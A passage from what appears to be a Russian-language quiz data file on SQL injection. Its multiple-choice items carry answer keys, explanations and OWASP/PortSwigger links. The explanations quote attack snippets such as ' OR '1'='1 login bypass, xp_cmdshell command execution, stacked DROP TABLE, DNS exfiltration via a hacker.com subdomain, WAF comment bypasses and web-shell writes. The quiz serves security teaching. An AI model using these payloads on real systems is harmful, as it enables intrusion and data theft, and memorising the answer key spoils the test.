            "Это строка, вызывающая переполнение буфера в стеке обработки запросов SQL сервера, пропуская этап проверки пароля",
            "Это специальная команда для сброса пароля пользователя `admin` на значение по умолчанию ('password' или '123456')",
            "Это команда на принудительное удаление базы данных, которую сервер блокирует, но при этом авторизует пользователя",
            "Это зарезервированный сервисный код, используемый технической поддержкой вендора для аварийного доступа",
            "Это команда переключения базы данных в режим отладки, где проверка прав доступа временно отключается"
        ],
        correctAnswerIndex: 0,
        explanation: "Условие `WHERE username = 'admin' AND password = '...' OR '1'='1'` вернёт все строки таблицы (или первую/все, в зависимости от логики), позволяя войти без пароля.",
        link: {
            label: "OWASP: SQL Injection",
            url: "https://owasp.org/www-community/attacks/SQL_Injection"
        }
    },
    {
        question: "Чем опасен динамический SQL (Dynamic SQL) внутри хранимых процедур (Stored Procedures)?",
        answers: [
            "Если параметры напрямую конкатенируются в строку запроса (например, через `EXEC` или `sp_executesql`), инъекция возможна так же, как и в обычном коде",
            "Динамический SQL выполняется слишком быстро, что позволяет атакующему проводить Time-based атаки с большей точностью",
            "Результаты динамического SQL не кэшируются сервером, что приводит к повышенной нагрузке и возможности DoS атак",
            "Он требует значительно больше оперативной памяти для компиляции каждого запроса, истощая ресурсы сервера",
            "Текст динамических запросов всегда сохраняется в логах сервера в открытом виде, включая пароли",
            "Динамический SQL блокирует всю таблицу на время выполнения, останавливая работу легитимных пользователей",
            "Он абсолютно безопасен, так как хранимые процедуры компилируются заранее и проверяют типы данных"
        ],
        correctAnswerIndex: 0,
        explanation: "Многие считают, что использование хранимых процедур защищает от SQLi. Это верно только если не используется конкатенация строк внутри самой процедуры.",
        link: {
            label: "OWASP: SQL Injection Prevention",
            url: "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
        }
    },
    {
        question: "Что такое 'SQL Truncation Attack'?",
        answers: [
            "Атака, при которой слишком длинная строка ввода обрезается базой до лимита поля, что может привести к логическим ошибкам (например, созданию дубликата `admin`)",
            "Удаление пробелов и специальных символов из начала и конца строки, изменяющее смысл запроса",
            "Обрезание файлов логов транзакций для скрытия следов несанкционированного доступа к базе данных",
            "Сжатие базы данных путем удаления старых записей, инициированное злоумышленником для потери данных",
            "Геометрическая атака на алгоритмы пространственного поиска (Spatial Search) в GIS расширениях",
            "Отсечение 'хвоста' SQL запроса с помощью символа комментария для игнорирования части условий WHERE",
            "Автоматическое удаление всех комментариев из кода хранимых процедур при их обновлении"
        ],
        correctAnswerIndex: 0,
        explanation: "В старых версиях MySQL при вставке строки длиннее поля она молча обрезалась. Если `admin       x` обрезается до `admin`, то проверка на уникальность может пройти, а при логине пробелы игнорируются -> взлом аккаунта.",
        link: {
            label: "HackTricks: SQL Truncation",
            url: "https://book.hacktricks.xyz/pentesting-web/sql-injection#sql-truncation"
        }
    },
    {
        question: "Как защитить функцию поиска LIKE от инъекции (например, чтобы пользователь не ввел '%')?",
        answers: [
            "Необходимо вручную экранировать спецсимволы LIKE (`%`, `_`) в пользовательском вводе, даже при использовании Prepared Statements",
            "Использование Prepared Statements автоматически и безопасно экранирует все символы, включая `%` и `_`",
            "Полностью запретить функцию поиска на сайте, так как безопасная реализация `LIKE` невозможна",
            "Использовать только оператор точного совпадения `=`, отказавшись от поиска по подстроке",
            "Удалять все символы пунктуации и спецсимволы из поискового запроса на клиентской стороне (JavaScript)",
            "Заменять все символы процента `%` на звездочку `*` перед выполнением SQL запроса",
            "Ничего делать не нужно, современные базы данных сами определяют, является ли `%` частью данных или оператором"
        ],
        correctAnswerIndex: 0,
        explanation: "Prepared statements защищают от выхода за пределы строки, но `%` и `_` являются валидными данными внутри LIKE. Если бизнес-логика не подразумевает wildcards от пользователя, их надо экранировать.",
        link: {
            label: "StackOverflow: Escaping LIKE",
            url: "https://stackoverflow.com/questions/8247970/using-like-wildcard-in-prepared-statement"
        }
    },
    {
        question: "Почему параметр `ORDER BY` часто уязвим для SQL Injection, даже если используется ORM/Prepared Statements?",
        answers: [
            "Потому что спецификация SQL не позволяет использовать плейсхолдеры (Bind Variables) для идентификаторов столбцов и таблиц, заставляя разработчиков использовать конкатенацию",
            "Потому что оператор `ORDER BY` выполняется после `SELECT`, и данные уже сформированы и не проверяются",
            "Потому что сортировка часто происходит на стороне клиента (в браузере), а сервер просто отдает сырые данные",
            "Потому что номер столбца в `ORDER BY` — это число, а инъекции возможны только через строковые параметры",
            "Потому что большинство ORM (Object-Relational Mapping) библиотек игнорируют параметры сортировки ради производительности",
            "Это распространенный миф, инъекции в `ORDER BY` невозможны, так как там не используются кавычки",
            "Потому что в секции `ORDER BY` нельзя использовать комментарии, что затрудняет эксплуатацию уязвимости"
        ],
        correctAnswerIndex: 0,
        explanation: 'В SQL нельзя написать `ORDER BY ?`. Разработчики часто вынуждены конкатенировать имя столбца: `ORDER BY " + col + "`. Если `col` не валидируется по белому списку — это инъекция.',
        link: {
            label: "PortSwigger: SQLi in ORDER BY",
            url: "https://portswigger.net/web-security/sql-injection/blind"
        }
    },
    {
        question: "Какая особенность синтаксиса `LIMIT` в MySQL (до 8.0) позволяла эксплуатировать SQL Injection?",
        answers: [
            "В старых версиях MySQL `LIMIT` позволял инъекцию через конструкцию `PROCEDURE ANALYSE()`, даже если принимал только числа",
            "Оператор `LIMIT` позволял выполнять деструктивные команды вроде `DROP TABLE` сразу после указания числа строк",
            "MySQL поддерживал использование оператора `UNION` после `LIMIT`, что позволяло объединять результаты",
            "Параметр `LIMIT` никогда не фильтровался и не проверялся на тип данных, принимая любые строки",
            "Внутри `LIMIT` можно было использовать многострочные комментарии `/* ... */` для скрытия пейлоада",
            "Это не является уязвимостью, так как `LIMIT` влияет только на количество возвращаемых строк",
            "Оператор `LIMIT` выполнялся перед `SELECT`, что нарушало порядок обработки запроса"
        ],
        correctAnswerIndex: 0,
        explanation: "В старых MySQL после LIMIT можно было использовать `PROCEDURE ANALYSE()`, что давало вектора для Error-based инъекций.",
        link: {
            label: "HackTricks: MySQL Injection",
            url: "https://book.hacktricks.xyz/pentesting-web/sql-injection/mysql-injection"
        }
    },
    {
        question: "Если инъекция происходит в секции `HAVING`, какой вектор атаки наиболее вероятен?",
        answers: [
            "Аналогично `WHERE`, но `HAVING` применяется после группировки, позволяя использовать условия для Blind или Error-based инъекций",
            "В этой секции возможны только Time-based атаки, так как вывод данных невозможен",
            "Только `UNION` атаки, так как `HAVING` позволяет присоединять новые таблицы",
            "Секция `HAVING` всегда безопасна, если используется `GROUP BY` по первичному ключу",
            "Через `HAVING` можно изменить структуру таблицы, используя команду `ALTER TABLE`",
            "Через `HAVING` можно удалять произвольные строки из базы данных без прав администратора",
            "Инъекции в `HAVING` не существует, это теоретическая концепция, не работающая на практике"
        ],
        correctAnswerIndex: 0,
        explanation: "HAVING фильтрует группы. Инъекция здесь работает так же, как и в WHERE, но контекст запроса подразумевает наличие GROUP BY.",
        link: {
            label: "Netsparker: SQLi in HAVING",
            url: "https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/"
        }
    },
    {
        question: "Можно ли эксплуатировать SQL Injection через HTTP заголовки (Cookie, User-Agent, Referer)?",
        answers: [
            "Да, если приложение доверяет этим заголовкам и использует их в SQL запросах (например, для логирования или аналитики) без очистки",
            "Нет, HTTP заголовки обрабатываются веб-сервером и никогда не попадают в SQL запросы приложения",
            "Только через заголовок `Cookie`, остальные заголовки (`User-Agent`, `Referer`) безопасны и не могут быть вектором атаки",
            "Только если сайт работает по протоколу HTTP, в HTTPS все заголовки зашифрованы и недоступны для модификации",
            "Это возможно только в устаревших PHP приложениях версии 5.x и ниже, современные фреймворки это блокируют",
            "Все заголовки автоматически экранируются веб-сервером (Apache/Nginx) перед передачей приложению",
            "Нет, слишком длинные заголовки вызывают переполнение буфера (Buffer Overflow), а не SQL Injection"
        ],
        correctAnswerIndex: 0,
        explanation: "Часто разработчики доверяют HTTP заголовкам. Это классический вектор для Second-Order SQLi (когда пейлоад сохраняется и срабатывает позже при просмотре логов админом) или прямой инъекции.",
        link: {
            label: "PortSwigger: SQLi in Headers",
            url: "https://portswigger.net/web-security/sql-injection/lab-sql-injection-attack-query-string-and-cookies"
        }
    },
    {
        question: "Какой оператор конкатенации строк является стандартным в SQL (ANSI) и поддерживается в PostgreSQL и Oracle?",
        answers: [
            "|| (две вертикальные черты)",
            "+ (плюс)",
            "CONCAT()",
            "& (амперсанд)",
            ". (точка)",
            "~ (тильда)",
            "MERGE()"
        ],
        correctAnswerIndex: 0,
        explanation: "В MySQL используется `CONCAT()` (или `||` если включен PIPE_AS_CONCAT). В MSSQL — `+`. В Oracle и PostgreSQL стандарт ANSI — `||`.",
        link: {
            label: "PortSwigger: SQLi Cheat Sheet",
            url: "https://portswigger.net/web-security/sql-injection/cheat-sheet"
        }
    },
    {
        question: "Почему код `SELECT * FROM users WHERE user = '$u' AND pass = '$p'` уязвим, если переменные не фильтруются?",
        answers: [
            "Атакующий может выйти за пределы кавычек (escape) и внедрить собственный SQL код (например, `' OR '1'='1`), изменив логику запроса",
            "Использование двойных кавычек в SQL запросах нарушает стандарт ANSI и вызывает ошибки совместимости",
            "Имена переменных `$u` и `$p` слишком короткие и неинформативные, что затрудняет аудит кода",
            "Пароль передается в открытом виде, что позволяет перехватить его с помощью сниффера трафика",
            "Запрос `SELECT *` возвращает слишком много данных, что может вызвать замедление работы базы данных",
            "Это абсолютно безопасный код, если переменные `$u` и `$p` являются строками в языке программирования",
            "Такой запрос создаст слишком большую нагрузку на процессор базы данных при большом количестве пользователей"
        ],
        correctAnswerIndex: 0,
        explanation: "Это классический пример уязвимого кода. Внедренный SQL код становится частью команды, выполняемой базой данных.",
        link: {
            label: "OWASP: SQL Injection Prevention",
            url: "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
        }
    },
    {
        question: "Какой синтаксис используется для Time-Based Blind SQL Injection в MS SQL Server?",
        answers: [
            "WAITFOR DELAY '0:0:5'",
            "SLEEP(5)",
            "pg_sleep(5)",
            "benchmark(5000000,MD5(1))",
            "dbms_lock.sleep(5)",
            "timeout(5)",
            "pause(5)"
        ],
        correctAnswerIndex: 0,
        explanation: "В MSSQL задержка вызывается командой `WAITFOR DELAY`. `SLEEP()` — для MySQL, `pg_sleep()` — для PostgreSQL.",
        link: {
            label: "HackTricks: MSSQL Injection",
            url: "https://book.hacktricks.xyz/pentesting-web/sql-injection/mssql-injection"
        }
    },
    {
        question: "Что принципиально отличает NoSQL Injection (MongoDB и др.) от SQL Injection?",
        answers: [
            "Синтаксис зависит от типа NoSQL БД (часто JSON/BSON) и используются специфичные операторы (например, `$ne`, `$where`) вместо SQL команд",
            "NoSQL инъекции — это миф, так как NoSQL базы данных не используют язык структурированных запросов SQL",
            "В NoSQL базах данных можно скомпрометировать только пароли пользователей, данные остаются в безопасности",
            "NoSQL базы данных всегда безопаснее SQL аналогов, так как они новее и разработаны с учетом современных угроз",
            "NoSQL инъекции работают исключительно через XML-парсеры, встроенные в драйверы базы данных",
            "Это одно и то же, разницы нет, кроме названия используемой базы данных в строке подключения",
            "NoSQL базы данных не используют запросы как таковые, они работают через прямой доступ к файлам на диске"
        ],
        correctAnswerIndex: 0,
        explanation: "Хотя цель та же (изменить логику запроса), в NoSQL (как MongoDB) атака часто идет через JSON объекты (`{'$ne': 1}`) или JS выражения.",
        link: {
            label: "OWASP: NoSQL Injection",
            url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_NoSQL_Injection"
        }
    },
    {
        question: "Какая встроенная хранимая процедура в MS SQL Server (обычно требующая включения) позволяет выполнять команды ОС?",
        answers: [
            "xp_cmdshell",
            "exec_os_cmd",
            "sp_execute_external",
            "run_cmd",
            "system_call",
            "shell_exec",
            "cmd_run"
        ],
        correctAnswerIndex: 0,
        explanation: "`xp_cmdshell` — мощная функция в MSSQL, позволяющая выполнять команды Windows Shell. Часто отключена, но может быть включена через `sp_configure`, если у пользователя (sa) есть права.",
        link: {
            label: "HackTricks: MSSQL xp_cmdshell",
            url: "https://book.hacktricks.xyz/pentesting-web/sql-injection/mssql-injection#xp_cmdshell"
        }
    },
    {
        question: "Для чего в Error-Based SQL Injection часто используют функции `CAST()` или `CONVERT()` (например, в MSSQL)?",
        answers: [
            "Чтобы вызвать преднамеренную ошибку преобразования типов (например, строки в число), текст которой будет содержать данные из базы",
            "Чтобы преобразовать извлеченные данные в формат JSON для удобного чтения на стороне клиента",
            "Чтобы зашифровать данные перед выводом, скрывая их от систем предотвращения утечек информации (DLP)",
            "Чтобы скрыть атаку от Web Application Firewall (WAF), так как эти функции часто находятся в белых списках",
            "Чтобы ускорить выполнение запроса за счет приведения всех данных к единому целочисленному типу",
            "Это функции, предназначенные исключительно для работы с датами и временем, их использование здесь ошибка",
            "Для очистки пользовательского ввода от опасных символов перед выполнением запроса"
        ],
        correctAnswerIndex: 0,
        explanation: "Преобразование строки (результата SELECT) в INT вызывает ошибку: 'Conversion failed when converting the varchar value 'secret' to data type int'. База данных сама 'сливает' данные в тексте ошибки.",
        link: {
            label: "PortSwigger: Blind SQLi (Error based)",
            url: "https://portswigger.net/web-security/sql-injection/blind"
        }
    },
    {
        question: "Какая функция возвращает имя текущего пользователя, под которым выполняется запрос в MySQL?",
        answers: [
            "USER() или CURRENT_USER()",
            "GET_USER()",
            "WHOAMI()",
            "ME()",
            "SYSTEM_ID()",
            "AUTH_USER()",
            "LOGIN()"
        ],
        correctAnswerIndex: 0,
        explanation: "`USER()` возвращает имя пользователя и хост, предоставленные клиентом. `CURRENT_USER()` — аккаунт, который MySQL использовал для проверки прав (может отличаться).",
        link: {
            label: "MySQL: Information Functions",
            url: "https://dev.mysql.com/doc/refman/8.0/en/information-functions.html"
        }
    },
    {
        question: "Как узнать имя текущего пользователя базы данных в MS SQL Server?",
        answers: [
            "USER_NAME() или SYSTEM_USER",
            "GET_USER()",
            "WHOAMI",
            "CURRENT_LOGIN()",
            "DB_USER()",
            "SHOW USER",
            "SELECT USER FROM DUAL"
        ],
        correctAnswerIndex: 0,
        explanation: "`USER_NAME()` возвращает имя пользователя в текущей базе данных. `SYSTEM_USER` — логин на уровне сервера.",
        link: {
            label: "Microsoft: SYSTEM_USER",
            url: "https://learn.microsoft.com/en-us/sql/t-sql/functions/system-user-transact-sql"
        }
    },
    {
        question: "Как атакующий может обойти простейший WAF, который блокирует пробелы в SQL запросе?",
        answers: [
            "Использовать комментарии `/**/`, символы табуляции `%09`, перевод строки `%0A` или скобки `()` вместо пробелов",
            "Использовать двойные или тройные пробелы, которые WAF может посчитать безопасными",
            "Написать SQL запрос задом наперед и использовать функцию `REVERSE()` на сервере",
            "Зашифровать весь запрос в формат Base64 и передать его в параметре `base64_query`",
            "Использовать протокол HTTPS, чтобы WAF не смог прочитать содержимое запроса и найти пробелы",
            "Послать запрос дважды с минимальной задержкой, чтобы вызвать состояние гонки (Race Condition) в WAF",
            "Это невозможно, так как пробелы являются обязательными разделителями лексем в стандарте SQL"
        ],
        correctAnswerIndex: 0,
        explanation: "SQL парсеры очень гибки. `SELECT/**/col/**/FROM/**/tab` валидно. `SELECT(col)FROM(tab)` тоже валидно. Это позволяет обходить фильтры на пробел (Space Bypass).",
        link: {
            label: "OWASP: SQL Injection Evasion",
            url: "https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF"
        }
    },

    {
        question: "Что такое Second-Order SQL Injection?",
        answers: [
            "Инъекция, при которой вредоносные данные сохраняются в БД (вставка), а срабатывают позже в другом запросе (выборка), когда эти данные извлекаются",
            "Инъекция второго уровня сложности по классификации OWASP, требующая прав администратора для эксплуатации",
            "Инъекция, использующая два последовательных запроса `UNION SELECT` для объединения данных из разных баз данных",
            "Атака на резервную копию базы данных (Secondary DB), которая используется только для чтения отчетов",
            "Атака на механизмы двухфакторной аутентификации (2FA), позволяющая обойти запрос второго фактора через SQL запрос",
            "Специфическая временная инъекция, которая работает только в определенные дни недели из-за особенностей планировщика задач",
            "Такого технического термина не существует в контексте веб-безопасности, это вымышленное название"
        ],
        correctAnswerIndex: 0,
        explanation: "Опасность Second-Order (Stored) SQLi в том, что данные могут пройти валидацию при входе, но считаться доверенными при извлечении и использовании в другом месте.",
        link: {
            label: "PortSwigger: Second-order SQLi",
            url: "https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based"
        }
    },
    {
        question: "Как работает техника DNS Exfiltration (OOB) при SQL Injection?",
        answers: [
            "База данных заставляется выполнить DNS запрос к домену атакующего (например, `hacker.com`), передавая данные в виде поддомена (`secret.hacker.com`)",
            "Атакующий получает доступ к панели управления DNS записями сайта и изменяет A-запись на свой IP-адрес",
            "Через скрытый DNS туннель скачивается полный дамп базы данных, минуя ограничения фаервола на исходящий трафик",
            "Это атака типа 'Отказ в обслуживании' (DoS) на DNS сервер провайдера, а не эксплуатация уязвимости SQL Injection",
            "SQL сервер переконфигурируется и начинает работать как публичный DNS резолвер, обрабатывая запросы из интернета",
            "Через TXT записи в DNS внедряется вредоносный JavaScript код, который выполняется в браузере администратора",
            "Этот метод работает исключительно в базе данных Oracle, так как другие СУБД не имеют возможности делать сетевые запросы"
        ],
        correctAnswerIndex: 0,
        explanation: "Если нет прямого вывода (Blind) и Time-based фильтруется, Out-of-Band (OOB) через DNS — отличный способ получить данные.",
        link: {
            label: "HackTricks: OOB Data Exfiltration",
            url: "https://book.hacktricks.xyz/pentesting-web/sql-injection-1/sql-injection-oob-out-of-band"
        }
    },
    {
        question: "Зачем атакующие используют шестнадцатеричное (HEX) кодирование строк в пейлоадах (например, `0x61646D696E`)?",
        answers: [
            "Чтобы передать строковое значение (например, 'admin') без использования кавычек, что позволяет обойти простые фильтры WAF",
            "Чтобы зашифровать SQL запрос с помощью ключа администратора, делая его нечитаемым для систем защиты",
            "Чтобы сжать размер передаваемого запроса, так как HEX представление занимает меньше места в HTTP пакете",
            "Чтобы принудительно перевести базу данных в бинарный режим работы для доступа к низкоуровневым функциям",
            "HEX кодировка обрабатывается сервером базы данных значительно быстрее, чем обычные текстовые строки",
            "MySQL и другие базы данных понимают данные только в HEX формате, текстовый ввод преобразуется драйвером",
            "Для улучшения читаемости логов сервера базы данных, так как HEX формат является стандартом де-факто"
        ],
        correctAnswerIndex: 0,
        explanation: "В MySQL `SELECT * FROM users WHERE user = 0x61646D696E` эквивалентно `user = 'admin'`, но не содержит кавычек, которые может резать WAF.",
        link: {
            label: "OWASP: SQL Injection Evasion",
            url: "https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF"
        }
    },
    {
        question: "В чем суть техники 'Conditional Error' (Blind SQLi)?",
        answers: [
            "Атакующий создает запрос, который вызывает системную ошибку БД (например, деление на ноль) только если проверяемое условие истинно",
            "Ошибка базы данных возникает случайно из-за высокой нагрузки, что позволяет судить о наличии уязвимости",
            "Система управления базой данных автоматически исправляет синтаксические ошибки в запросах злоумышленника",
            "Это сообщение об ошибке нарушения лицензионного соглашения, которое появляется при попытке взлома Enterprise версий",
            "Использование конструкций `IF/ELSE` в SQL коде для перебора всех возможных вариантов текста ошибки",
            "Это просто другое название для Time-Based SQL Injection, так как механизмы их работы абсолютно идентичны",
            "База данных игнорирует любые ошибки в SQL запросах, если они выполняются с правами гостя"
        ],
        correctAnswerIndex: 0,
        explanation: "Если приложение скрывает данные, но возвращает HTTP 500 на ошибку SQL, можно использовать `SELECT IF(1=1, 1/0, 1)`. Если условие верно -> ошибка -> 500.",
        link: {
            label: "PortSwigger: Blind SQLi (Conditional Error)",
            url: "https://portswigger.net/web-security/sql-injection/blind"
        }
    },
    {
        question: "Какую роль играет инструмент Burp Suite Repeater при тестировании на SQL Injection?",
        answers: [
            "Позволяет вручную модифицировать параметры HTTP запроса, переотправлять их и детально анализировать 'сырые' ответы сервера для поиска уязвимостей",
            "Автоматически сканирует веб-сайт на наличие всех известных уязвимостей, включая SQL Injection, XSS и CSRF",
            "Используется для брутфорса паролей администратора базы данных через форму входа с высокой скоростью",
            "Генерирует красивые PDF отчеты о найденных уязвимостях для предоставления заказчику пентеста",
            "Это просто локальный прокси-сервер для перенаправления трафика, не имеющий функций модификации запросов",
            "Умеет перехватывать и расшифровывать только HTTPS трафик, игнорируя обычные HTTP соединения",
            "Это встроенная база данных для хранения результатов сканирования уязвимостей и истории запросов"
        ],
        correctAnswerIndex: 0,
        explanation: "Repeater — основной инструмент пентестера. Он позволяет точно 'тюнить' пейлоад, проверять фильтры и видеть 'сырой' ответ сервера.",
        link: {
            label: "PortSwigger: Using Burp Repeater",
            url: "https://portswigger.net/burp/documentation/desktop/tools/repeater"
        }
    },
    {
        question: "Для чего в Blind SQL Injection используются функции `ASCII()` (или `ORD()`) и `CHAR()`?",
        answers: [
            "Для преобразования символов в их числовые коды (ASCII), что позволяет сравнивать их с числами в алгоритме бинарного поиска",
            "Чтобы удалить все не-ASCII символы из вывода базы данных для предотвращения ошибок кодировки на странице",
            "Для принудительной перекодировки данных в UTF-8 перед их выводом пользователю для корректного отображения",
            "Используются для рисования псевдографических таблиц в консоли при эксплуатации Time-Based инъекций",
            "Для работы с бинарными данными изображений и файлов, хранящихся в базе данных в формате BLOB",
            "Эти функции устарели и больше не используются в современных методологиях тестирования на проникновение",
            "Для шифрования трафика между базой данных и приложением, чтобы скрыть следы атаки от IPS"
        ],
        correctAnswerIndex: 0,
        explanation: "Так как в Blind SQLi мы часто можем получать только ответ Да/Нет, проще спрашивать 'код символа больше 100?', чем перебирать все буквы.",
        link: {
            label: "OWASP: Blind SQL Injection",
            url: "https://owasp.org/www-community/attacks/Blind_SQL_Injection"
        }
    },
    {
        question: "Какая особенность функции `SUBSTRING()` (или `SUBSTR()`) в SQL важна для атакующего?",
        answers: [
            "Индексация строк в SQL начинается с 1, а не с 0 (как в большинстве языков программирования), что важно учитывать при переборе символов",
            "Эта функция работает только с числовыми данными, преобразуя строки в числа перед извлечением подстроки",
            "При неправильном использовании она удаляет исходную строку из базы данных, что может привести к потере данных",
            "Она автоматически переворачивает извлеченную подстроку задом наперед для защиты от чтения человеком",
            "Индексация символов начинается с -1 (с конца строки), что позволяет читать пароли только в обратном порядке",
            "Она каждый раз возвращает случайную подстроку для обфускации данных, что делает атаку невозможной",
            "Эту функцию нельзя использовать в секции `WHERE` SQL запроса, только в списке выбираемых полей `SELECT`"
        ],
        correctAnswerIndex: 0,
        explanation: "Очевидная, но частая ошибка новичков. `SUBSTRING('Data', 1, 1)` вернет 'D'. `SUBSTRING('Data', 0, 1)` часто вернет пустую строку или ошибку.",
        link: {
            label: "SQL: SUBSTRING Function",
            url: "https://www.w3schools.com/sql/func_mysql_substring.asp"
        }
    },
    {
        question: "Зачем перед перебором символов пароля (Blind SQLi) часто пытаются узнать его длину с помощью `LENGTH()` / `LEN()`?",
        answers: [
            "Чтобы оптимизировать атаку, зная точное количество итераций, необходимых для посимвольного перебора пароля",
            "Чтобы оценить криптографическую стойкость пароля на основе его длины и соответствия политикам безопасности",
            "Чтобы проверить сам факт существования пароля в базе данных перед началом более сложных атак",
            "Это обязательное требование протокола HTTP — передавать длину контента в заголовке `Content-Length`",
            "Узнать длину строки через Blind SQL Injection невозможно, это теоретическое ограничение данного типа атак",
            "Чтобы сгенерировать радужную таблицу соответствующего размера для последующего офлайн взлома хеша",
            "Для обхода Web Application Firewall (WAF), который блокирует запросы длиннее определенного количества символов"
        ],
        correctAnswerIndex: 0,
        explanation: "Сначала находим длину (`LENGTH(pass)=8`), потом перебираем 8 символов. Это экономит время по сравнению с бесконечным циклом `while(true)`.",
        link: {
            label: "PortSwigger: Blind SQLi Cheatsheet",
            url: "https://portswigger.net/web-security/sql-injection/cheat-sheet"
        }
    },
    {
        question: "Какое условие НЕОБХОДИМО для записи веб-шелла через `SELECT ... INTO OUTFILE` в MySQL?",
        answers: [
            "Пользователь БД должен иметь привилегию `FILE`, а системная переменная `secure_file_priv` должна разрешать запись в целевую директорию",
            "Необходимо получить права `root` операционной системы сервера, иначе запись файлов будет невозможна",
            "На сервере должен быть открыт порт 22 (SSH) для возможности подключения и загрузки файлов",
            "Антивирусное программное обеспечение на сервере должно быть полностью отключено перед началом атаки",
            "Нужно знать пароль администратора веб-сайта для авторизации в административной панели управления",
            "Этот вектор атаки работает исключительно на серверах под управлением ОС Windows из-за особенностей файловой системы",
            "Достаточно иметь права на выполнение команды `SELECT`, запись файлов разрешена всем пользователям по умолчанию"
        ],
        correctAnswerIndex: 0,
        explanation: "Современные конфигурации MySQL по умолчанию ограничивают `secure_file_priv` (например, `/var/lib/mysql-files/`), откуда веб-сервер не может исполнять скрипты.",
        link: {
            label: "HackTricks: MySQL RCE",
            url: "https://book.hacktricks.xyz/pentesting-web/sql-injection/mysql-injection#file-system-access"
        }
    },
    {
        question: "Что такое 'SQL Injection Polyglot'?",
        answers: [
            "Специально сформированный пейлоад, который остается валидным и исполняемым одновременно в нескольких контекстах или разных СУБД",
            "Компьютерный вирус, написанный на нескольких языках программирования для заражения разных систем",
            "Программа-переводчик SQL запросов с одного диалекта на другой для обеспечения совместимости приложений",
            "Метод шифрования данных 'на лету', использующий несколько различных алгоритмов одновременно",
            "SQL запрос, написанный с использованием китайских иероглифов для обхода фильтрации по ASCII символам",
            "Универсальный драйвер базы данных, поддерживающий подключение к любой СУБД без дополнительной настройки",
            "Атака, использующая многопоточность для одновременной эксплуатации нескольких разных уязвимостей"
        ],
        correctAnswerIndex: 0,
        explanation: "Полиглоты (например, `/*`*/'/*`/*\"/*` */`) экономят время при фаззинге, позволяя одним запросом проверить уязвимость в разных ситуациях.",
        link: {
            label: "GitHub: SQLi Polyglots",
            url: "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/polyglots.txt"
        }
    },
    {
        question: "Что такое 'Stacked Queries' (Batched Queries) и почему это опасно?",
        answers: [
            "Возможность выполнить цепочку из нескольких SQL запросов в одном вызове, разделенных точкой с запятой `;` (например, для DROP TABLE)",
            "Специфические запросы, которые выполняются в стеке вызовов процессора, вызывая переполнение буфера",
            "Использование множественных вложенных подзапросов (Subqueries) для обхода ограничений на количество строк",
            "Запросы к API сайта StackOverflow для автоматического поиска решений ошибок SQL синтаксиса",
            "Техника эксплуатации переполнения стека (Buffer Overflow) в движке базы данных через длинные запросы",
            "Этот тип атак работает исключительно в базе данных MySQL версий 5.0 и ниже",
            "Это безопасная функция оптимизации производительности, которая не может быть использована для атак"
        ],
        correctAnswerIndex: 0,
        explanation: "Если приложение поддерживает Stacked Queries (PHP/PDO + MySQL обычно нет, но ASP.NET + MSSQL или PHP + PostgreSQL часто да), атакующий может выполнить `DROP TABLE users` или `EXEC xp_cmdshell`.",
        link: {
            label: "PortSwigger: SQL Injection Stacked Queries",
            url: "https://portswigger.net/web-security/sql-injection#examining-the-database"
        }
    },
    {
        question: "Может ли SQL Injection привести к Cross-Site Scripting (XSS)?",
        answers: [
            "Да, через Reflected XSS (вывод ошибки SQL с тегами) или Stored XSS (запись XSS-пейлоада в базу, который потом отображается у жертвы)",
            "Нет, это совершенно разные классы уязвимостей, которые эксплуатируются на разных уровнях приложения",
            "Только в том случае, если база данных сама написана на языке JavaScript (например, MongoDB)",
            "Только в старых версиях браузера Internet Explorer, которые некорректно обрабатывали SQL ответы",
            "Нет, современные браузеры автоматически блокируют любой SQL код, если он попадает в HTML разметку",
            "Да, но это приведет только к Self-XSS, которая не опасна для других пользователей системы",
            "Только через внедрение вредоносного CSS кода, который изменяет внешний вид страницы, но не выполняет скрипты"
        ],
        correctAnswerIndex: 0,
        explanation: "Это классическая цепочка атак. Атакующий внедряет `<script>alert(1)</script>` в поле `username` через SQLi, и админ видит алерт в админке.",
        link: {
            label: "OWASP: SQL Injection to XSS",
            url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection"
        }
    },
    {
        question: "Для чего используется `xp_cmdshell` в MS SQL Server?",
        answers: [
            "Это расширенная хранимая процедура, позволяющая выполнять произвольные команды операционной системы (RCE) прямо из SQL запроса",
            "Используется для удаленного запуска командной строки `cmd.exe` на компьютере клиента (жертвы)",
            "Специальная утилита для управления оболочкой Windows Shell через графический интерфейс SSMS",
            "Служебная процедура для создания автоматических резервных копий базы данных по расписанию",
            "Устаревшая функция для хеширования паролей пользователей по алгоритму `XP Shell` (Windows XP)",
            "Это известный компьютерный вирус, который поражает MS SQL Server, если не установлены обновления",
            "Для настройки параметров XP (Experience Points) в игровых серверах, использующих MSSQL"
        ],
        correctAnswerIndex: 0,
        explanation: "По умолчанию отключена, но если включена (или атакующий может её включить через `sp_configure`), это прямой путь к захвату сервера.",
        link: {
            label: "Microsoft: xp_cmdshell",
            url: "https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql"
        }
    },
    {
        question: "Какая функция в PostgreSQL используется для Time-Based Blind SQL Injection?",
        answers: [
            "pg_sleep(seconds)",
            "sleep()",
            "waitfor delay",
            "benchmark()",
            "pause()",
            "delay()",
            "timeout()"
        ],
        correctAnswerIndex: 0,
        explanation: "`pg_sleep(10)` приостанавливает выполнение запроса на 10 секунд. В MySQL это `SLEEP()`, в MSSQL `WAITFOR DELAY`.",
        link: {
            label: "PostgreSQL: Delay Execution",
            url: "https://www.postgresql.org/docs/current/functions-datetime.html#FUNCTIONS-DATETIME-DELAY"
        }
    },
    {
        question: "Чем функция `BENCHMARK()` в MySQL полезна для атакующего?",
        answers: [
            "Она позволяет выполнить выражение заданное количество раз, создавая нагрузку на CPU и вызывая задержку (аналог sleep)",
            "Она показывает детальную статистику производительности сервера базы данных в реальном времени",
            "Она запускает внешний бенчмарк веб-сайта для проверки скорости загрузки страниц у пользователей",
